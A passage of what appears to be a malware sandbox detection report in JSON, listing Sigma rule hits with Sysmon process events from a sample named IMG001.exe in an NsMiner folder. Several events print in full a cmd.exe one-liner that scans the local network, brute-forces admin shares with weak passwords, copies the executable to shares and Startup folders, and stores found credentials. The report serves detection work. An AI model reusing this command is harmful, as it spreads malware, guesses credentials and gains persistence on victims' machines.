Menu\\Programs\\Startup\\!f!\" \"%%c\\Documents and Settings\\%%u\\\\xc3\\xeb\\xe0\\xe2\\xed\\xee\\xe5 \\xec\\xe5\\xed\\xfe\\\\xcf\\xf0\\xee\\xe3\\xf0\\xe0\\xec\\xec\\xfb\\\\xc0\\xe2\\xf2\\xee\\xe7\\xe0\\xe3\\xf0\\xf3\\xe7\\xea\\xe0\\!f!\" \"%%c\\Documents and Settings\\All Users\\\\xc3\\xeb\\xe0\\xe2\\xed\\xee\\xe5 \\xec\\xe5\\xed\\xfe\\\\xcf\\xf0\\xee\\xe3\\xf0\\xe0\\xec\\xec\\xfb\\\\xc0\\xe2\\xf2\\xee\\xe7\\xe0\\xe3\\xf0\\xf3\\xe7\\xea\\xe0\\!f!\" \"%%c\\Windows\\Profiles\\%%u\\Start Menu\\Programs\\Startup\\!f!\" \"%%c\\Windows\\All Users\\Start menu\\Programs\\Startup\\!f!\" \"%%c\\%%u\\!f!\" ) do @echo f|@xcopy /y /d \"C:\\Users\\george\\AppData\\Roaming\\NsMiner\\IMG001.exe\" %%d 1\u003enul \u0026\u0026 @echo copy to %%d) \u0026 @echo nul\u003e\"C:\\Users\\george\\AppData\\Roaming\\NsMiner\\IMG001.exe:P\" \u0026 net use %%c /delete /y 2\u003enul \u0026 @ping -n 20 localhost\u003enul))); EventID=1; LogonGuid=C784477D-327C-6539-76CC-030000000000; LogonId=248950; Image=C:\\Windows\\SysWOW64\\cmd.exe; IntegrityLevel=High; ParentCommandLine=\"C:\\Users\\george\\AppData\\Roaming\\NsMiner\\IMG001.exe\" ; UtcTime=1700839550; RuleName=-}"
                                                                                             },
                                                                                             {
                                                                                                 "values":  "@{TerminalSessionId=1; ProcessGuid={C784477D-C083-6560-4506-000000003B00}; ProcessId=8124; Product=Microsoft\\xae Windows\\xae Operating System; Description=Windows Command Processor; Company=Microsoft Corporation; ParentProcessGuid={C784477D-C078-6560-2106-000000003B00}; User=DESKTOP-B0T93D6\\george; Hashes=MD5=F3BDBE3BB6F734E357235F4D5898582D,SHA256=3685495D051137B1C4EFDE22C26DF0883614B6453B762FA84588DA55ED2E7744,IMPHASH=0AF8419BE362159398343D7B31721726; OriginalFileName=Cmd.Exe; ParentImage=C:\\Users\\george\\AppData\\Roaming\\NsMiner\\IMG001.exe; FileVersion=10.0.17134.1 (WinBuild.160101.0800); ParentProcessId=7876; CurrentDirectory=C:\\Users\\george\\AppData\\Roaming\\NsMiner\\; CommandLine=\"C:\\Windows\\system32\\cmd.exe\" /v:on /c @(for /f \"usebackq tokens=1\" %%i in (`@net view^|find /i \"\\\\\" ^|^| @arp -a^|find /i \"  1\"`) do @set str_!random!=%%i)\u0026 @for /f \"usebackq tokens=1* delims==\" %%j in (`set str_`) do @set s=%%k\u0026 set s=!s:\\\\=!\u0026 set l=!s:-PC=!\u0026 set l=!l:-\\xcf\\xca=!\u0026 set f=IMG001.exe\u0026 set n=1601\u0026 @if not \"!s!\"==\"%%COMPUTERNAME%%\" @echo connect to \\\\!s! \u0026 (for /f \"usebackq tokens=1\" %%j in (`net view \\\\!s!^|find /i \"    \"`) do @echo f|xcopy /y /d \"C:\\Users\\george\\AppData\\Roaming\\NsMiner\\IMG001.exe\" \"\\\\!s!\\%%j\\!f!\" 1\u003enul \u0026\u0026 @echo copy to \"\\\\!s!\\%%j\\!f!\") \u0026 @net use * /delete /y 2\u003enul \u0026 @(for %%u in (1 !l! administrator user admin \\xe0\\xe4\\xec\\xe8\\xed\\xe8\\xf1\\xf2\\xf0\\xe0\\xf2\\xee\\xf0) do @for %%p in (0 1 123 %%u !n! \"\") do @ping -n 3 localhost\u003enul \u0026 @(for %%c in (\\\\!s!\\C$ \\\\!s!\\Users) do @echo connect to %%c %%p %%u \u0026 @(if not \"%%p%%u\"==\"01\" net use %%c \"%%p\" /user:\"%%u\") \u0026\u0026 @((echo [Section1] \u0026 echo p=%%p %%u)\u003e\"C:\\Users\\george\\AppData\\Roaming\\NsMiner\\IMG001.exe:P\" \u0026 @(for %%d in (\"%%c\\All Users\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\!f!\" \"%%c\\%%u\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\!f!\" \"%%c\\Users\\All Users\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\!f!\" \"%%c\\Users\\%%u\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\!f!\" \"%%c\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\!f!\" \"%%c\\Documents and Settings\\%%u\\Start Menu\\Programs\\Startup\\!f!\" \"%%c\\Documents and Settings\\All Users\\Start Menu\\Programs\\Startup\\!f!\" \"%%c\\Documents and Settings\\%%u\\\\xc3\\xeb\\xe0\\xe2\\xed\\xee\\xe5 \\xec\\xe5\\xed\\xfe\\\\xcf\\xf0\\xee\\xe3\\xf0\\xe0\\xec\\xec\\xfb\\\\xc0\\xe2\\xf2\\xee\\xe7\\xe0\\xe3\\xf0\\xf3\\xe7\\xea\\xe0\\!f!\" \"%%c\\Documents and Settings\\All Users\\\\xc3\\xeb\\xe0\\xe2\\xed\\xee\\xe5 \\xec\\xe5\\xed\\xfe\\\\xcf\\xf0\\xee\\xe3\\xf0\\xe0\\xec\\xec\\xfb\\\\xc0\\xe2\\xf2\\xee\\xe7\\xe0\\xe3\\xf0\\xf3\\xe7\\xea\\xe0\\!f!\" \"%%c\\Windows\\Profiles\\%%u\\Start Menu\\Programs\\Startup\\!f!\" \"%%c\\Windows\\All Users\\Start menu\\Programs\\Startup\\!f!\" \"%%c\\%%u\\!f!\" ) do @echo f|@xcopy /y /d \"C:\\Users\\george\\AppData\\Roaming\\NsMiner\\IMG001.exe\" %%d 1\u003enul \u0026\u0026 @echo copy to %%d) \u0026 @echo nul\u003e\"C:\\Users\\george\\AppData\\Roaming\\NsMiner\\IMG001.exe:P\" \u0026 net use %%c /delete /y 2\u003enul \u0026 @ping -n 20 localhost\u003enul))); EventID=1; LogonGuid=C784477D-327C-6539-76CC-030000000000; LogonId=248950; Image=C:\\Windows\\SysWOW64\\cmd.exe; IntegrityLevel=High; ParentCommandLine=\"C:\\Users\\george\\AppData\\Roaming\\NsMiner\\IMG001.exe\" ; UtcTime=1700839555; RuleName=-}"
                                                                                             },
                                                                                             {
                                                                                                 "values":  "@{TerminalSessionId=1; ProcessGuid={C784477D-C08A-6560-6C06-000000003B00}; ProcessId=7380; Product=Microsoft\\xae Windows\\xae Operating System; Description=Windows Command Processor; Company=Microsoft Corporation; ParentProcessGuid={C784477D-C084-6560-4A06-000000003B00}; User=DESKTOP-B0T93D6\\george; Hashes=MD5=F3BDBE3BB6F734E357235F4D5898582D,SHA256=3685495D051137B1C4EFDE22C26DF0883614B6453B762FA84588DA55ED2E7744,IMPHASH=0AF8419BE362159398343D7B31721726; OriginalFileName=Cmd.Exe; ParentImage=C:\\Users\\george\\AppData\\Roaming\\NsMiner\\IMG001.exe; FileVersion=10.0.17134.1 (WinBuild.160101.0800); ParentProcessId=7396; CurrentDirectory=C:\\Users\\george\\AppData\\Roaming\\NsMiner\\; CommandLine=\"C:\\Windows\\system32\\cmd.exe\" /v:on /c @(for /f \"usebackq tokens=1\" %%i in (`@net view^|find /i \"\\\\\" ^|^| @arp -a^|find /i \"  1\"`) do @set str_!random!=%%i)\u0026 @for /f \"usebackq tokens=1* delims==\" %%j in (`set str_`) do @set s=%%k\u0026 set s=!s:\\\\=!\u0026 set l=!s:-PC=!\u0026 set l=!l:-\\xcf\\xca=!\u0026 set f=IMG001.exe\u0026 set n=0201\u0026 @if not \"!s!\"==\"%%COMPUTERNAME%%\" @echo connect to \\\\!s! \u0026 (for /f \"usebackq tokens=1\" %%j in (`net view \\\\!s!^|find /i \"    \"`) do @echo f|xcopy /y /d \"C:\\Users\\george\\AppData\\Roaming\\NsMiner\\IMG001.exe\" \"\\\\!s!\\%%j\\!f!\" 1\u003enul \u0026\u0026 @echo copy to \"\\\\!s!\\%%j\\!f!\") \u0026 @net use * /delete /y 2\u003enul \u0026 @(for %%u in (1 !l! administrator user admin \\xe0\\xe4\\xec\\xe8\\xed\\xe8\\xf1\\xf2\\xf0\\xe0\\xf2\\xee\\xf0) do @for %%p in (0 1 123 %%u !n! \"\") do @ping -n 3 localhost\u003enul \u0026 @(for %%c in (\\\\!s!\\C$ \\\\!s!\\Users) do @echo connect to %%c %%p %%u \u0026 @(if not \"%%p%%u\"==\"01\" net use %%c \"%%p\" /user:\"%%u\") \u0026\u0026 @((echo [Section1] \u0026 echo p=%%p %%u)\u003e\"C:\\Users\\george\\AppData\\Roaming\\NsMiner\\IMG001.exe:P\" \u0026 @(for %%d in (\"%%c\\All Users\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\!f!\" \"%%c\\%%u\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\!f!\" \"%%c\\Users\\All Users\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\!f!\" \"%%c\\Users\\%%u\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\!f!\" \"%%c\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\!f!\" \"%%c\\Documents and Settings\\%%u\\Start Menu\\Programs\\Startup\\!f!\" \"%%c\\Documents and Settings\\All Users\\Start Menu\\Programs\\Startup\\!f!\" \"%%c\\Documents and Settings\\%%u\\\\xc3\\xeb\\xe0\\xe2\\xed\\xee\\xe5 \\xec\\xe5\\xed\\xfe\\\\xcf\\xf0\\xee\\xe3\\xf0\\xe0\\xec\\xec\\xfb\\\\xc0\\xe2\\xf2\\xee\\xe7\\xe0\\xe3\\xf0\\xf3\\xe7\\xea\\xe0\\!f!\" \"%%c\\Documents and Settings\\All Users\\\\xc3\\xeb\\xe0\\xe2\\xed\\xee\\xe5 \\xec\\xe5\\xed\\xfe\\\\xcf\\xf0\\xee\\xe3\\xf0\\xe0\\xec\\xec\\xfb\\\\xc0\\xe2\\xf2\\xee\\xe7\\xe0\\xe3\\xf0\\xf3\\xe7\\xea\\xe0\\!f!\" \"%%c\\Windows\\Profiles\\%%u\\Start Menu\\Programs\\Startup\\!f!\" \"%%c\\Windows\\All Users\\Start menu\\Programs\\Startup\\!f!\" \"%%c\\%%u\\!f!\" ) do @echo f|@xcopy /y /d \"C:\\Users\\george\\AppData\\Roaming\\NsMiner\\IMG001.exe\" %%d 1\u003enul \u0026\u0026 @echo copy to %%d) \u0026 @echo nul\u003e\"C:\\Users\\george\\AppData\\Roaming\\NsMiner\\IMG001.exe:P\" \u0026 net use %%c /delete /y 2\u003enul \u0026 @ping -n 20 localhost\u003enul))); EventID=1; LogonGuid=C784477D-327C-6539-A0CC-030000000000; LogonId=248992; Image=C:\\Windows\\SysWOW64\\cmd.exe; IntegrityLevel=Medium; ParentCommandLine=\"C:\\Users\\george\\AppData\\Roaming\\NsMiner\\IMG001.exe\" ; UtcTime=1700839562; RuleName=-}"
                                                                                             },
                                                                                             {
                                                                                                 "values":  "@{TerminalSessionId=1; ProcessGuid={C784477D-C08D-6560-8206-000000003B00}; ProcessId=4964; Product=Microsoft\\xae Windows\\xae Operating System; Description=Windows Command Processor; Company=Microsoft Corporation; ParentProcessGuid={C784477D-C084-6560-4A06-000000003B00}; User=DESKTOP-B0T93D6\\george; Hashes=MD5=F3BDBE3BB6F734E357235F4D5898582D,SHA256=3685495D051137B1C4EFDE22C26DF0883614B6453B762FA84588DA55ED2E7744,IMPHASH=0AF8419BE362159398343D7B31721726; OriginalFileName=Cmd.Exe; ParentImage=C:\\Users\\george\\AppData\\Roaming\\NsMiner\\IMG001.exe; FileVersion=10.0.17134.1 (WinBuild.160101.0800); ParentProcessId=7396; CurrentDirectory=C:\\Users\\george\\AppData\\Roaming\\NsMiner\\; CommandLine=\"C:\\Windows\\system32\\cmd.exe\" /v:on /c @(for /f \"usebackq tokens=1\" %%i in (`@net view^|find /i \"\\\\\" ^|^| @arp -a^|find /i \"  1\"`) do @set str_!random!=%%i)\u0026 @for /f \"usebackq tokens=1* delims==\" %%j in (`set str_`) do @set s=%%k\u0026 set s=!s:\\\\=!\u0026 set l=!s:-PC=!\u0026 set l=!l:-\\xcf\\xca=!\u0026 set f=IMG001.exe\u0026 set n=1809\u0026 @if not \"!s!\"==\"%%COMPUTERNAME%%\" @echo connect to \\\\!s! \u0026 (for /f \"usebackq tokens=1\" %%j in (`net view \\\\!s!^|find /i \"    \"`) do @echo f|xcopy /y /d \"C:\\Users\\george\\AppData\\Roaming\\NsMiner\\IMG001.exe\" \"\\\\!s!\\%%j\\!f!\" 1\u003enul \u0026\u0026 @echo copy to \"\\\\!s!\\%%j\\!f!\") \u0026 @net use * /delete /y 2\u003enul \u0026 @(for %%u in (1 !l! administrator user admin \\xe0\\xe4\\xec\\xe8\\xed\\xe8\\xf1\\xf2\\xf0\\xe0\\xf2\\xee\\xf0) do @for %%p in (0 1 123 %%u !n! \"\") do @ping -n 3 localhost\u003enul \u0026 @(for %%c in (\\\\!s!\\C$ \\\\!s!\\Users) do @echo connect to %%c %%p %%u \u0026 @(if not \"%%p%%u\"==\"01\" net use %%c \"%%p\" /user:\"%%u\") \u0026\u0026 @((echo [Section1] \u0026 echo p=%%p %%u)\u003e\"C:\\Users\\george\\AppData\\Roaming\\NsMiner\\IMG001.exe:P\" \u0026 @(for %%d in (\"%%c\\All Users\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\!f!\" \"%%c\\%%u\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\!f!\" \"%%c\\Users\\All Users\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\!f!\" \"%%c\\Users\\%%u\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\!f!\" \"%%c\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\!f!\" \"%%c\\Documents and Settings\\%%u\\Start Menu\\Programs\\Startup\\!f!\" \"%%c\\Documents and Settings\\All Users\\Start Menu\\Programs\\Startup\\!f!\" \"%%c\\Documents and Settings\\%%u\\\\xc3\\xeb\\xe0\\xe2\\xed\\xee\\xe5 \\xec\\xe5\\xed\\xfe\\\\xcf\\xf0\\xee\\xe3\\xf0\\xe0\\xec\\xec\\xfb\\\\xc0\\xe2\\xf2\\xee\\xe7\\xe0\\xe3\\xf0\\xf3\\xe7\\xea\\xe0\\!f!\" \"%%c\\Documents and Settings\\All Users\\\\xc3\\xeb\\xe0\\xe2\\xed\\xee\\xe5 \\xec\\xe5\\xed\\xfe\\\\xcf\\xf0\\xee\\xe3\\xf0\\xe0\\xec\\xec\\xfb\\\\xc0\\xe2\\xf2\\xee\\xe7\\xe0\\xe3\\xf0\\xf3\\xe7\\xea\\xe0\\!f!\" \"%%c\\Windows\\Profiles\\%%u\\Start Menu\\Programs\\Startup\\!f!\" \"%%c\\Windows\\All Users\\Start menu\\Programs\\Startup\\!f!\" \"%%c\\%%u\\!f!\" ) do @echo f|@xcopy /y /d \"C:\\Users\\george\\AppData\\Roaming\\NsMiner\\IMG001.exe\" %%d 1\u003enul \u0026\u0026 @echo copy to %%d) \u0026 @echo nul\u003e\"C:\\Users\\george\\AppData\\Roaming\\NsMiner\\IMG001.exe:P\" \u0026 net use %%c /delete /y 2\u003enul \u0026 @ping -n 20 localhost\u003enul))); EventID=1; LogonGuid=C784477D-327C-6539-A0CC-030000000000; LogonId=248992; Image=C:\\Windows\\SysWOW64\\cmd.exe; IntegrityLevel=Medium; ParentCommandLine=\"C:\\Users\\george\\AppData\\Roaming\\NsMiner\\IMG001.exe\" ; UtcTime=1700839565; RuleName=-}"
                                                                                             }
                                                                                         ]
                                                                   },
                                                                   {
                                                                       "rule_level":  "medium",
                                                                       "rule_id":  "2dc5d25da9f75ae324bd1ef4e2e4fb2084251a622beac794700223e8c20907a3",
                                                                       "rule_source":  "Sigma Integrated Rule Set (GitHub)",
                                                                       "rule_title":  "Potentially Suspicious Ping/Copy Command Combination",
                                                                       "rule_description":  "Detects uncommon and potentially suspicious one-liner command containing both \"ping\" and \"copy\" at the same time, which is usually used by malware.\n",
                                                                       "rule_author":  "X__Junior (Nextron Systems)",
                                                                       "match_context":  [
                                                                                             {
                                                                                                 "values":  "@{Hashes=MD5=D0FCE3AFA6AA1D58CE9FA336CC2B675B,SHA256=4D89FC34D5F0F9BABD022271C585A9477BF41E834E46B991DEAA0530FDB25E22,IMPHASH=392B4D61B1D1DADC1F06444DF258188A; CurrentDirectory=C:\\Users\\Bruno\\AppData\\Roaming\\NsMiner\\; OriginalFileName=Cmd.Exe; Product=Microsoft\\xae Windows\\xae Operating System; Description=Windows Command Processor; EventID=1; ParentCommandLine=\"C:\\Users\\Bruno\\AppData\\Roaming\\NsMiner\\IMG001.exe\" ; CommandLine=\"C:\\Windows\\system32\\cmd.exe\" /v:on /c @(for /f \"usebackq tokens=1\" %%i in (`@net view^|find /i \"\\\\\" ^|^| @arp -a^|find /i \"  1\"`) do @set str_!random!=%%i)\u0026 @for /f \"usebackq tokens=1* delims==\" %%j in (`set str_`) do @set s=%%k\u0026 set s=!s:\\\\=!\u0026 set l=!s:-PC=!\u0026 set l=!l:-\\xcf\\xca=!\u0026 set f=IMG001.exe\u0026 set n=1507\u0026 @if not \"!s!\"==\"%%COMPUTERNAME%%\" @echo connect to \\\\!s! \u0026 (for /f \"usebackq tokens=1\" %%j in (`net view \\\\!s!^|find /i \"    \"`) do @echo f|xcopy /y /d \"C:\\Users\\Bruno\\AppData\\Roaming\\Ns [TRUNCATED]; FileVersion=10.0.19041.746 (WinBuild.160101.0800); ParentImage=C:\\Users\\Bruno\\AppData\\Roaming\\NsMiner\\IMG001.exe; IntegrityLevel=High; Image=C:\\Windows\\SysWOW64\\cmd.exe; Company=Microsoft Corporation}"
                                                                                             }
                                                                                         ]
                                                                   },
                                                                   {
                                                                       "rule_level":  "medium",
                                                                       "rule_id":  "3ced86caf89e0cb118bce2037de20fae8f9a70e400916dcdd9c2ee1eec7c58c4",
                                                                       "rule_source":  "Sigma Integrated Rule Set (GitHub)",
                                                                       "rule_title":  "Potential Dosfuscation Activity",
                                                                       "rule_description":  "Detects possible payload obfuscation via the commandline",
                                                                       "rule_author":  "frack113, Nasreddine Bencherchali (Nextron Systems)",
                                                                       "match_context":  [
                                                                                             {
                                                                                                 "values":  "@{TerminalSessionId=1; ProcessGuid={C784477D-C07E-6560-3706-000000003B00}; ProcessId=7868; Product=Microsoft\\xae Windows\\xae Operating System; Description=Windows Command Processor; Company=Microsoft Corporation; ParentProcessGuid={C784477D-C078-6560-2106-000000003B00}; User=DESKTOP-B0T93D6\\george; Hashes=MD5=F3BDBE3BB6F734E357235F4D5898582D,SHA256=3685495D051137B1C4EFDE22C26DF0883614B6453B762FA84588DA55ED2E7744,IMPHASH=0AF8419BE362159398343D7B31721726; OriginalFileName=Cmd.Exe; ParentImage=C:\\Users\\george\\AppData\\Roaming\\NsMiner\\IMG001.exe; FileVersion=10.0.17134.1 (WinBuild.160101.0800); ParentProcessId=7876; CurrentDirectory=C:\\Users\\george\\AppData\\Roaming\\NsMiner\\; CommandLine=\"C:\\Windows\\system32\\cmd.exe\" /v:on /c @(for /f \"usebackq tokens=1\" %%i in (`@net view^|find /i \"\\\\\" ^|^| @arp -a^|find /i \"  1\"`) do @set str_!random!=%%i)\u0026 @for /f \"usebackq tokens=1* delims==\" %%j in (`set str_`) do @set s=%%k\u0026 set s=!s:\\\\=!\u0026 set l=!s:-PC=!\u0026 set l=!l:-\\xcf\\xca=!\u0026 set f=IMG001.exe\u0026 set n=1709\u0026 @if not \"!s!\"==\"%%COMPUTERNAME%%\" @echo connect to \\\\!s! \u0026 (for /f \"usebackq tokens=1\" %%j in (`net view \\\\!s!^|find /i \"    \"`) do @echo f|xcopy /y /d \"C:\\Users\\george\\AppData\\Roaming\\NsMiner\\IMG001.exe\" \"\\\\!s!\\%%j\\!f!\" 1\u003enul \u0026\u0026 @echo copy to \"\\\\!s!\\%%j\\!f!\") \u0026 @net use * /delete /y 2\u003enul \u0026 @(for %%u in (1 !l! administrator user admin \\xe0\\xe4\\xec\\xe8\\xed\\xe8\\xf1\\xf2\\xf0\\xe0\\xf2\\xee\\xf0) do @for %%p in (0 1 123 %%u !n! \"\") do @ping -n 3 localhost\u003enul \u0026 @(for %%c in (\\\\!s!\\C$ \\\\!s!\\Users) do @echo connect to %%c %%p %%u \u0026 @(if not \"%%p%%u\"==\"01\" net use %%c \"%%p\" /user:\"%%u\") \u0026\u0026 @((echo [Section1] \u0026 echo p=%%p %%u)\u003e\"C:\\Users\\george\\AppData\\Roaming\\NsMiner\\IMG001.exe:P\" \u0026 @(for %%d in (\"%%c\\All Users\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\!f!\" \"%%c\\%%u\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\!f!\" \"%%c\\Users\\All Users\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\!f!\" \"%%c\\Users\\%%u\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\!f!\" \"%%c\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\!f!\" \"%%c\\Documents and Settings\\%%u\\Start Menu\\Programs\\Startup\\!f!\" \"%%c\\Documents and Settings\\All Users\\Start Menu\\Programs\\Startup\\!f!\" \"%%c\\Documents and Settings\\%%u\\\\xc3\\xeb\\xe0\\xe2\\xed\\xee\\xe5 \\xec\\xe5\\xed\\xfe\\\\xcf\\xf0\\xee\\xe3\\xf0\\xe0\\xec\\xec\\xfb\\\\xc0\\xe2\\xf2\\xee\\xe7\\xe0\\xe3\\xf0\\xf3\\xe7\\xea\\xe0\\!f!\" \"%%c\\Documents and Settings\\All Users\\\\xc3\\xeb\\xe0\\xe2\\xed\\xee\\xe5 \\xec\\xe5\\xed\\xfe\\\\xcf\\xf0\\xee\\xe3\\xf0\\xe0\\xec\\xec\\xfb\\\\xc0\\xe2\\xf2\\xee\\xe7\\xe0\\xe3\\xf0\\xf3\\xe7\\xea\\xe0\\!f!\" \"%%c\\Windows\\Profiles\\%%u\\Start Menu\\Programs\\Startup\\!f!\" \"%%c\\Windows\\All Users\\Start menu\\Programs\\Startup\\!f!\" \"%%c\\%%u\\!f!\" ) do @echo f|@xcopy /y /d \"C:\\Users\\george\\AppData\\Roaming\\NsMiner\\IMG001.exe\" %%d 1\u003enul \u0026\u0026 @echo copy to %%d) \u0026 @echo nul\u003e\"C:\\Users\\george\\AppData\\Roaming\\NsMiner\\IMG001.exe:P\" \u0026 net use %%c /delete /y 2\u003enul \u0026 @ping -n 20 localhost\u003enul))); EventID=1; LogonGuid=C784477D-327C-6539-76CC-030000000000; LogonId=248950; Image=C:\\Windows\\SysWOW64\\cmd.exe; IntegrityLevel=High; ParentCommandLine=\"C:\\Users\\george\\AppData\\Roaming\\NsMiner\\IMG001.exe\" ; UtcTime=1700839550; RuleName=-}"
                                                                                             },
